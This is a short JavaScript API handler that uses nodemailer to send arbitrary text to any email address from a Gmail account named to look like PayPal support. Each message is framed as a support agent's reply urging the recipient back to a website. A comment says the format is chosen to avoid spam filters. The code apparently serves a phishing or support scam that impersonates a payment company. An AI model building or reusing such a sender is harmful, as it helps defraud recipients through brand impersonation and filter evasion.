import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, email, message } = req.body;

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'paypalsmartsupsupport@gmail.com',
      pass: process.env.GMAIL_APP_PASSWORD
    }
  });

  // Plain text-first approach to avoid spam filters
  const plainText = `Hi ${name},\n\nA support agent has replied to your message:\n\n---\n${message}\n---\n\nReturn to the website to continue the conversation.\n\npaypalsmartsupsupport@gmail.com`;

  try {
    await transporter.sendMail({
      from: 'paypalsmartsupsupport@gmail.com',
      to: email,
      subject: `Re: Your support message`,
      text: plainText,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Nodemailer error:", error);
    res.status(500).json({ error: error.message });
  }
}
